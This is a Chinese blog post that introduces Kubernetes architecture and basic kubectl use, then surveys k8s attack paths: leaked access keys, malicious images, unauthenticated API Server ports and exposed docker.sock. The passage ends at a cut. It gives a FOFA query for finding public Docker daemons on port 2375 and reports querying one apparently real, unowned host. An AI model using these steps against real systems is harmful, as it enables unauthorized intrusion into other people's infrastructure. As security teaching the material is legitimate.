<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>k8s安全 入门学习 | ConsT27's Blog</title><meta name="keywords" content="云相关"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="k8s安全 入门学习#0x01云 云的定义看似模糊，但本质上，它是一个用于描述全球服务器网络的术语，每个服务器都有一个独特的功能。云不是一个物理实体，而是一个庞大的全球远程服务器网络，它们连接在一起，旨在作为单一的生态系统运行。这些服务器设计用于存储和管理数据、运行应用程序，或者交付内容&#x2F;服务（如视频短片、Web 邮件、办公室生产力软件或社交媒体）。不是从本地或个人计算机访问文件和数据，而是通过任">
<meta property="og:type" content="article">
<meta property="og:title" content="k8s安全 入门学习">
<meta property="og:url" content="http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="ConsT27&#39;s Blog">
<meta property="og:description" content="k8s安全 入门学习#0x01云 云的定义看似模糊，但本质上，它是一个用于描述全球服务器网络的术语，每个服务器都有一个独特的功能。云不是一个物理实体，而是一个庞大的全球远程服务器网络，它们连接在一起，旨在作为单一的生态系统运行。这些服务器设计用于存储和管理数据、运行应用程序，或者交付内容&#x2F;服务（如视频短片、Web 邮件、办公室生产力软件或社交媒体）。不是从本地或个人计算机访问文件和数据，而是通过任">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png">
<meta property="article:published_time" content="2022-03-13T05:03:22.559Z">
<meta property="article:modified_time" content="2022-03-13T05:03:04.534Z">
<meta property="article:author" content="ConsT27">
<meta property="article:tag" content="云相关">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219183209.png"><link rel="canonical" href="http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-13 13:03:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">k8s安全 入门学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-13T05:03:22.559Z" title="发表于 2022-03-13 13:03:22">2022-03-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-13T05:03:04.534Z" title="更新于 2022-03-13 13:03:04">2022-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="k8s安全-入门学习"><a href="#k8s安全-入门学习" class="headerlink" title="k8s安全 入门学习"></a>k8s安全 入门学习</h1><h1 id="0x01云"><a href="#0x01云" class="headerlink" title="#0x01云"></a>#0x01云</h1><blockquote>
<p>云的定义看似模糊，但本质上，它是一个用于描述全球服务器网络的术语，每个服务器都有一个独特的功能。云不是一个物理实体，而是一个庞大的全球远程服务器网络，它们连接在一起，旨在作为单一的生态系统运行。这些服务器设计用于存储和管理数据、运行应用程序，或者交付内容/服务（如视频短片、Web 邮件、办公室生产力软件或社交媒体）。不是从本地或个人计算机访问文件和数据，而是通过任何支持 Internet 的设备在线访问 - 这些信息在必要时随时随地可用。</p>
</blockquote>
<blockquote>
<p>企业采用 4 种不同的方法部署云资源。存在一个<a target="_blank" rel="noopener" href="https://azure.microsoft.com/zh-cn/overview/what-is-a-public-cloud/">公有云</a>，它通过 Internet 共享资源并向公众提供服务；一个<a target="_blank" rel="noopener" href="https://azure.microsoft.com/zh-cn/overview/what-is-a-private-cloud/">私有云</a>，它不进行共享且经由通常本地托管的私有内部网络提供服务；一个<a target="_blank" rel="noopener" href="https://azure.microsoft.com/zh-cn/overview/what-is-hybrid-cloud-computing/">混合云</a>，它根据其目的在公有云和私有云之间共享服务；以及一个社区云，它仅在组织之间（例如与政府机构）共享资源。</p>
</blockquote>
<p>《云是什么- 定义 - Microsoft Azure》</p>
<h1 id="0x02-何为k8s-？"><a href="#0x02-何为k8s-？" class="headerlink" title="#0x02 何为k8s ？"></a>#0x02 何为k8s ？</h1><p>k8s即Kubernetes。<br>其为google开发来被用于容器管理的开源应用程序，可帮助创建和管理应用程序的容器化。<br>用一个的例子来描述：”当虚拟化容器Docker有太多要管理的时候，手动管理就会很麻烦，于是我们便可以通过k8s来简化我们的管理”</p>
<h2 id="K8S-架构简述"><a href="#K8S-架构简述" class="headerlink" title="K8S 架构简述"></a>K8S 架构简述</h2><p>我们在上文已经知道，K8S是用于管理虚拟化容器的一个应用系统，在这小节中会着重讲述K8S的架构、实现原理。</p>
<p>下图为K8S架构的概览：</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304020932.png"></p>
<p>k8s主要由较少的master节点以及其对应的多个Node节点组成。master用于对Node节点进行控制管理，一个k8s集群中至少要有一台master节点。</p>
<p>Master节点中包含很多的组件，主要为如下</p>
<blockquote>
<p><em>etcd</em><br>它存储集群中每个节点可以使用的配置信息。它是一个高可用性键值存储，可以在多个节点之间分布。只有Kubernetes API服务器可以访问它，因为它可能具有一些敏感信息。这是一个分布式键值存储，所有人都可以访问。<br>简而言之：存储节点信息</p>
</blockquote>
<p><em>API server</em><br>Kubernetes是一个API服务器，它使用API在集群上提供所有操作。API服务器实现了一个接口，这意味着不同的工具和库可以轻松地与其进行通信。Kubeconfig是与可用于通信的服务器端工具一起的软件包。它公开了Kubernetes API<br>简而言之：读取与解析请求指令的中枢</p>
<p><em>Controller Manage</em><br>该组件负责调节群集状态并执行任务的大多数收集器。通常，可以将其视为在非终止循环中运行的守护程序，该守护程序负责收集信息并将其发送到API服务器。它致力于获取群集的共享状态，然后进行更改以使服务器的当前状态达到所需状态。关键控制器是复制控制器，端点控制器，名称空间控制器和服务帐户控制器。控制器管理器运行不同类型的控制器来处理节点，端点等。<br>简而言之：维护k8s资源</p>
<p><em>Scheduler</em><br>这是Kubernetes master的关键组件之一。它是主服务器中负责分配工作负载的服务。它负责跟踪群集节点上工作负载的利用率，然后将工作负载放在可用资源上并接受该工作负载。换句话说，这是负责将Pod分配给可用节点的机制。调度程序负责工作负载利用率，并将Pod分配给新节点。<br>简而言之：负载均衡调度器</p>
<p>Node节点也包含了很多组件，主要如下</p>
<blockquote>
<p>Docker<br>Docker引擎，运行着容器的基础环境</p>
</blockquote>
<p>kubelet<br>在每个node节点都存在一份，主要来执行关于资源操作的指令，负责pod的维护。</p>
<p>kube-proxy<br>代理服务，用于负载均衡，在多个pod之间做负载均衡</p>
<p>fluentd<br>日志收集服务</p>
<p>pod<br>pod是k8s的最小服务单元，pod内部才是容器，k8s通过操作pod来操作容器。一个Node节点可以有多个Pod</p>
<p>Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源。<br>这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021454.png"></p>
<h2 id="搭建K8S"><a href="#搭建K8S" class="headerlink" title="搭建K8S"></a>搭建K8S</h2><p>我是跟着这个文章来的，K8S搭建很繁琐。。。</p>
<p><a target="_blank" rel="noopener" href="https://www.updateweb.cn/zwfec/item-367.html">https://www.updateweb.cn/zwfec/item-367.html</a></p>
<h2 id="K8S的基础概念"><a href="#K8S的基础概念" class="headerlink" title="K8S的基础概念"></a>K8S的基础概念</h2><p>ref:<a target="_blank" rel="noopener" href="https://kuboard.cn/learning/">https://kuboard.cn/learning/</a>(非常好的中文教程)</p>
<p><a target="_blank" rel="noopener" href="https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/">https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/</a>(k8s官方教程，有交互式操作界面，稍微有点不好的是有些地方没有中文)</p>
<h3 id="部署——Deployment"><a href="#部署——Deployment" class="headerlink" title="部署——Deployment"></a>部署——Deployment</h3><p>k8s中的应用程序是通过 Deployment来部署的，Deployment来指导k8s完成应用程序的部署和更新维护。<br>比如说，当Deployment在部署应用时，master节点会选择最合适的节点创建包含相应Container（容器）的POD<br>又比如说，Deployment会监控应用程序实例，当运行应用程序的工作节点宕机时，它将会在判断集群中最适宜重新部署的工作节点，并在其上面重新创建新的实例（新创建的应用程序的POD ip和pod名会与之前的不同）。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021109.png"></p>
<p>相关命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看 Deployment</span><br><span class="line">kubectl get deployments</span><br><span class="line"></span><br><span class="line"># 查看 Pod</span><br><span class="line">kubectl get pods</span><br><span class="line"></span><br><span class="line">#根据yaml文件部署</span><br><span class="line">kubectl apply -f nginx-deployment.yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一个yaml文件差不多就长这样</span><br><span class="line">apiVersion: apps&#x2F;v1  #与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本</span><br><span class="line">kind: Deployment  #该配置的类型，我们使用的是 Deployment</span><br><span class="line">metadata:          #译名为元数据，即 Deployment 的一些基本属性和信息</span><br><span class="line">  name: nginx-deployment  #Deployment 的名称</span><br><span class="line">  labels:      #标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解</span><br><span class="line">    app: nginx  #为该Deployment设置key为app，value为nginx的标签</span><br><span class="line">spec:          #这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用</span><br><span class="line">  replicas: 1  #使用该Deployment创建一个应用程序实例</span><br><span class="line">  selector:      #标签选择器，与上面的标签共同作用，目前不需要理解</span><br><span class="line">    matchLabels: #选择包含标签app:nginx的资源</span><br><span class="line">      app: nginx</span><br><span class="line">  template:      #这是选择或创建的Pod的模板</span><br><span class="line">    metadata:  #Pod的元数据</span><br><span class="line">      labels:  #Pod的标签，上面的selector即选择包含标签app:nginx的Pod</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:      #期望Pod实现的功能（即在pod中部署）</span><br><span class="line">      containers:  #生成container，与docker中的container是同一种</span><br><span class="line">      - name: nginx  #container的名称</span><br><span class="line">        image: nginx:1.7.9  #使用镜像nginx:1.7.9创建container，该container默认80端口可访问</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="POD与Node"><a href="#POD与Node" class="headerlink" title="POD与Node"></a>POD与Node</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021045.png"></p>
<p>一个POD可以包含多个容器，这些容器共享着POD上的资源（如网络IP，存储空间等）<br>POD是集群上最基础的单元<br>每个POD对与其对应的节点Node绑定，一个POD对应着一个IP。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021455.png"></p>
<p>Pod需要在Node上运行，一个Node可以运行着多个Pod，一个Node对应着集群中的一台机器。<br>Node节点由Master节点统一管理，Master会根据各Node的资源可用程度自动调度Pod到不同的Node上。</p>
<p>再来说说Node</p>
<p>一个节点的状态大致有以下的东西</p>
<ul>
<li>Addresses</li>
<li>Conditions</li>
<li>Capacity and Allocatable</li>
<li>Info</li>
</ul>
<blockquote>
<p>地址</p>
</blockquote>
<ul>
<li><p>HostName：由节点的内核设置。可以通过 kubelet 的 —hostname-override 参数覆盖。</p>
</li>
<li><p>ExternalIP：通常是节点的可外部路由（从集群外可访问）的 IP 地址。</p>
</li>
<li><p>InternalIP：通常是节点的仅可在集群内部路由的 IP 地址。</p>
<blockquote>
<p>状况(conditions 字段描述了所有 Running 节点的状态)</p>
</blockquote>
</li>
<li><p>Ready 如节点是健康的并已经准备好接收 Pod 则为 True；False 表示节点不健康而且不能接收 Pod；Unknown 表示节点控制器在最近 node-monitor-grace-period 期间（默认 40 秒）没有收到节点的消息</p>
</li>
<li><p>DiskPressure为True则表示节点的空闲空间不足以用于添加新 Pod, 否则为 False</p>
</li>
<li><p>MemoryPressure为True则表示节点存在内存压力，即节点内存可用量低，否则为 False</p>
</li>
<li><p>PIDPressure为True则表示节点存在进程压力，即节点上进程过多；否则为 False</p>
</li>
<li><p>NetworkUnavailable为True则表示节点网络配置不正确；否则为 False</p>
<blockquote>
<p>容量与可分配</p>
</blockquote>
</li>
<li><p>描述节点上的可用资源：CPU、内存和可以调度到节点上的 Pod 的个数上限。</p>
<blockquote>
<p>信息</p>
</blockquote>
</li>
<li><p>关于节点的一般性信息，例如内核版本、Kubernetes 版本（kubelet 和 kube-proxy 版本）、 Docker 版本（如果使用了）和操作系统名称。这些信息由 kubelet 从节点上搜集而来。<br>相关命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取类型为Pod的资源列表</span><br><span class="line">kubectl get pods</span><br><span class="line"></span><br><span class="line">#获取类型为Node的资源列表</span><br><span class="line">kubectl get nodes</span><br><span class="line"></span><br><span class="line"># kubectl describe 资源类型 资源名称</span><br><span class="line"></span><br><span class="line">#查看名称为nginx-XXXXXX的Pod的信息</span><br><span class="line">kubectl describe pod nginx-XXXXXX  </span><br><span class="line"></span><br><span class="line">#查看名称为nginx的Deployment的信息</span><br><span class="line">kubectl describe deployment nginx  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#查看名称为nginx-pod-XXXXXXX的Pod内的容器打印的日志</span><br><span class="line">kubectl logs -f podname</span><br><span class="line"></span><br><span class="line">#在Pod中运行命令</span><br><span class="line">kubectl exec -it nginx-pod-xxxxxx &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="服务——Service"><a href="#服务——Service" class="headerlink" title="服务——Service"></a>服务——Service</h3><p>通过以上内容我们知道，应用程序所在的Pod是一直变动着的，而每个Pod的ip又不一样，但是对于前端用户来说，应用程序的访问地址应该是唯一的才行。<br>因此k8s提供了一个机制用来为前端屏蔽后端Pod变动带来的IP变动，这便是Service。<br>Service为一系列有相同特征的Pod（一个应用的Pod在不停变换，但是不论怎么变换这些Pod都有相同的特征）定义了一个统一的访问方式，<br>Service是通过标签选择器（<strong>LabelSelector</strong>）来识别有哪些Pod有相同特征（带有特定Lable标签的POD，Lable可以由用户设置，标签存在于所有K8S对象上并不仅仅局限于Pod） 可以编成一个容器组的。<br>Service有三种选项暴露应用程序的入口，可以通过设置应用程序配置文件中的Service 项的spec.type 值来调整</p>
</li>
<li><p><strong>ClusterIP</strong>（默认）<br>  在群集中的内部IP上公布服务，这种方式的 Service（服务）只在集群内部可以访问到</p>
</li>
<li><p><strong>NodePort</strong><br>  使用 NAT 在集群中每个的同一端口上公布服务。这种方式下，可以通过访问集群中任意节点+端口号的方式访问服务 <code>&lt;NodeIP&gt;:&lt;NodePort&gt;</code>。此时 ClusterIP 的访问方式仍然可用。</p>
</li>
<li><p><strong>LoadBalancer</strong><br>  在云环境中（需要云供应商可以支持）创建一个集群外部的负载均衡器，并为使用该负载均衡器的 IP 地址作为服务的访问地址。此时 ClusterIP 和 NodePort 的访问方式仍然可用。</p>
</li>
</ul>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021456.png"></p>
<p>如上图，Service A 会将请求转发至内部IP地址为10.10.10.1 的POD上，Service B同理，会转发到10.10.10.3、4、5 上</p>
<p>在每个节点上都有Kube-proxy服务，Service使用其将链接路由到Pod</p>
<h3 id="伸缩——Scaling"><a href="#伸缩——Scaling" class="headerlink" title="伸缩——Scaling"></a>伸缩——Scaling</h3><p>可以通过更改deployment配置文件中的replicas项来设置开启的POD数量<br>当流量增多导致应用程序POD负载加重后可以通过修改replicas增加POD数量来减轻负担，访问流量将会通过负载均衡在多个POD之间转发</p>
<h3 id="滚动更新——Rolling-Update"><a href="#滚动更新——Rolling-Update" class="headerlink" title="滚动更新——Rolling Update"></a>滚动更新——<strong>Rolling Update</strong></h3><p>当我们想对已经部署的程序进行升级更新，但又不想让程序停止，就可以使用滚动更新来实现。</p>
<p>滚动更新通过使用新版本的POD逐步替代旧版本POD来实现零停机更新</p>
<p>滚动更新是K8S默认的更新方式</p>
<h1 id="0x03-K8S安全"><a href="#0x03-K8S安全" class="headerlink" title="#0x03 K8S安全"></a>#0x03 K8S安全</h1><p>下图是K8S的一些攻击框架</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021457.png"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021458.png"></p>
<p>本文就围绕着这个框架，叙述一些有用的攻击手法吧</p>
<h2 id="初始访问"><a href="#初始访问" class="headerlink" title="初始访问"></a>初始访问</h2><h3 id="云账号AK泄露"><a href="#云账号AK泄露" class="headerlink" title="云账号AK泄露"></a>云账号AK泄露</h3><p>在如今的云的大环境下，许多业务代码想要与云服务进行通信，就需要通过accesskey这个东西进行鉴权，鉴权通过后才能与云服务进行通信。<br>通俗来讲，人想要访问一个服务，往往需要提供密码来进行身份验证；而代码想要访问一个云服务API，则需要提供accesskey来进行身份验证。<br>如果accesskey泄露了，我们便可以利用这个accesskey来与云服务通信，反弹个云主机的shell回来作为入口点慢慢往内打。</p>
<p>下面文章是关于云原生安全中accesskey安全更加详细的论述，阅读后可以对accesskey的概念有更深入的了解。</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/287512.html">https://www.freebuf.com/articles/web/287512.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/255717.html">https://www.freebuf.com/articles/web/255717.html</a></p>
<h3 id="恶意镜像"><a href="#恶意镜像" class="headerlink" title="恶意镜像"></a>恶意镜像</h3><p>在docker中，容器的建立依赖于镜像，如果而如果pull得到的镜像是一个恶意镜像，或者pull得到的镜像本身就存在安全漏洞，便会带来安全风险</p>
<p>下图便是dockerhub上部署挖矿软件的恶意镜像，它会从github上下载恶意挖矿软件进行挖矿<br>个人觉得此方法多用于钓鱼？</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021459.png"></p>
<h3 id="API-Server未授权"><a href="#API-Server未授权" class="headerlink" title="API Server未授权"></a>API Server未授权</h3><p>属于是K8S中的经典漏洞了</p>
<p>回顾一下API Server的作用，它在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权(关于磁盘挂载获取节点shell的技术在后面的小节中再进行详细论述）。</p>
<p>API Server可以在两个端口上提供了对外服务：8080（insecure-port，非安全端口）和6443（secure-port，安全端口），其中8080端口提供HTTP服务且无需身份认证，6443端口提供HTTPS服务且支持身份认证(8080和6443端口并不是固定的，是通过配置文件来控制的)。</p>
<h4 id="insecure-port-开启"><a href="#insecure-port-开启" class="headerlink" title="insecure-port 开启"></a>insecure-port 开启</h4><p>API Server在8080端口上开放的服务应该是用于测试，但如果其在生存环境中被暴露出来，攻击者便可以利用此端口进行对集群的攻击。</p>
<p>但是利用API Server的8080端口进行未授权活动的前提条件略显苛刻（配置失当+版本较低），8080端口服务是默认不启动的，但如果用户在 <code>/etc/kubernets/manifests/kube-apiserver.yaml</code> 中有 <code>--insecure-port=8080</code>配置项，那就启动了非安全端口，有了安全风险。</p>
<p>注：1.20版本后该选项已无效化</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021500.png"></p>
<p>环境前提：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">step1:进入cd /etc/kubernetes/manifests/</span><br><span class="line"></span><br><span class="line">step2: 修改api-kube.conf</span><br><span class="line"></span><br><span class="line">添加- -–insecure-port=<span class="number">8080</span></span><br><span class="line">添加- -–insecure-bind-address=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">Kubelet 会监听该文件的变化，当您修改了 /etc/kubernetes/manifests/kube-apiserver.yaml 文件之后,</span><br><span class="line">kubelet 将自动终止原有的 kube-apiserver-&#123;nodename&#125; 的 Pod，并自动创建一个使用了新配置参数的 Pod 作为替代。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021501.png"></p>
<h4 id="secure-port-配置错误"><a href="#secure-port-配置错误" class="headerlink" title="secure-port 配置错误"></a>secure-port 配置错误</h4><p>若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。<br>一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，吧system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令。（也就是secure-port变成某种意义上的insecure-port了）</p>
<p>复现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl -s https:<span class="comment">//192.168.111.20:6443/ --insecure-skip-tls-verify=true get nodes  (192.168.111.20:6443 是master节点上apiserver的secure-port)</span></span><br><span class="line">然后提示输入账户密码，随便乱输就行</span><br></pre></td></tr></table></figure>

<p>正常情况应该是这样</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021502.png"></p>
<p>但如果secure-port 配置失当出现了未授权，就会这样</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021503.png"></p>
<h3 id="configfile-泄露"><a href="#configfile-泄露" class="headerlink" title="configfile 泄露"></a>configfile 泄露</h3><p>k8s configfile配置文件中可能会有api-server登陆凭证等敏感信息，如果获取到了集群configfile内容（如泄露在github），将会对集群内部安全造成巨大影响。</p>
<p>这里引用阿里云社区的一张图</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021505.png"></p>
<h3 id="容器内部应用入侵"><a href="#容器内部应用入侵" class="headerlink" title="容器内部应用入侵"></a>容器内部应用入侵</h3><p>顾名思义，容器内部应用就有问题（比如内部应用是tomcat，且有RCE漏洞），从而就会导致黑客获取Pod shell，拿到入口点</p>
<h3 id="私有镜像库暴露"><a href="#私有镜像库暴露" class="headerlink" title="私有镜像库暴露"></a>私有镜像库暴露</h3><p>举个例子，如果一个企业它的许多云上应用都是用的自建的私有镜像搭建的，有一天它私有镜像泄露出来了，我们就可以通过审计等手段去挖掘私有镜像中的漏洞，造成供应链打击。</p>
<h3 id="docker-sock-利用"><a href="#docker-sock-利用" class="headerlink" title="docker.sock  利用"></a>docker.sock  利用</h3><p>Docker以server-client的形式工作，服务端叫Docker daemon，客户端叫docker client。<br>Docker daemon想调用docker指令，就需要通过docker.sock这个文件向docker client进行通讯。换句话说，Docker daemon通过docker.sock这个文件去管理docker容器（如创建容器，容器内执行命令，查询容器状态等）。<br>同时，Docker daemon也可以通过配置将docker.sock暴露在端口上，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。</p>
<h4 id="公网暴露"><a href="#公网暴露" class="headerlink" title="公网暴露"></a>公网暴露</h4><p>如果docker daemon 2375端口暴露在了公网上，那么便可以直接利用该端口控制docker容器，并通过新建容器配合磁盘挂载技术获取宿主机权限。</p>
<p>fofa搜索</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">server=<span class="string">&quot;Docker&quot;</span> &amp;&amp; port=<span class="string">&quot;2375&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以发现有很多暴露在公网的docker.sock，</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021504.png"></p>
<p>我们选一个来试试水</p>
<p>可以发现是成功的调用了API查询了容器状态</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021506.png"></p>
<p>然后我们可以通过如下指令，在指定容器内部执行命令</p>
